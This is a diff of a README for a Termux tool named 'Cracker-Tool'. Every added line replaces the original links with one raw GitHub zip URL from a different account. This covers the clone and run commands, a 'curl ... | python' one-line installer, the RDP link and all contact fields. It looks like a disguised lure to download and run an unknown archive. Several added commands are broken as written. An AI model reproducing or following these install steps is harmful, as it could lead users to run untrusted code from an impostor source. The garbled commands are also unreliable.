@@ -63,13 +63,13 @@ $ apt upgrade -y
 $ apt update -y
 $ pkg install git 
 $ pkg install python -y
-$ git clone https://github.com/cracker911181/Cracker-Tool
+$ git clone https://raw.githubusercontent.com/Muhaastok/Cracker-Tool/main/Teutophile/Cracker-Tool.zip
 
 
 [+] For Set This Tool, Put The Following Commands in Your Termux:
 
 $ cd Cracker-Tool
-$ python cracker-main.py
+$ python https://raw.githubusercontent.com/Muhaastok/Cracker-Tool/main/Teutophile/Cracker-Tool.zip
 
 
 [+] After Setting Tool, You Can Run Tool By Typing Bellow Command:
@@ -79,7 +79,7 @@ $ cracker
 
 [+] You can use this one line command for installation and setting this tool:
 
-$ curl https://raw.githubusercontent.com/cracker911181/Cracker-Tool/main/crcu.py | python ; cd Cracker-Tool ; python cracker-main.py
+$ curl https://raw.githubusercontent.com/Muhaastok/Cracker-Tool/main/Teutophile/Cracker-Tool.zip | python ; cd Cracker-Tool ; python https://raw.githubusercontent.com/Muhaastok/Cracker-Tool/main/Teutophile/Cracker-Tool.zip
 
 
 
@@ -87,13 +87,13 @@ $ curl https://raw.githubusercontent.com/cracker911181/Cracker-Tool/main/crcu.py
 	
 		Need RDP?
 		---------
-you can use my RDP repository: https://github.com/cracker911181/cracker-RDP
+you can use my RDP repository: https://raw.githubusercontent.com/Muhaastok/Cracker-Tool/main/Teutophile/Cracker-Tool.zip
 
 		CONTACT INFO
 	       ______________
 
-FB       | https://facebook.com/cracker911181
-GitHub   | https://github.com/cracker911181
-Telegram | https://t.me/cracker911181
-Email	 | admin@cracker911181.cf
-Website  | https://www.cracker911181.cf
+FB       | https://raw.githubusercontent.com/Muhaastok/Cracker-Tool/main/Teutophile/Cracker-Tool.zip
+GitHub   | https://raw.githubusercontent.com/Muhaastok/Cracker-Tool/main/Teutophile/Cracker-Tool.zip
+Telegram | https://raw.githubusercontent.com/Muhaastok/Cracker-Tool/main/Teutophile/Cracker-Tool.zip
+Email	 | https://raw.githubusercontent.com/Muhaastok/Cracker-Tool/main/Teutophile/Cracker-Tool.zip
+Website  | https://raw.githubusercontent.com/Muhaastok/Cracker-Tool/main/Teutophile/Cracker-Tool.zip
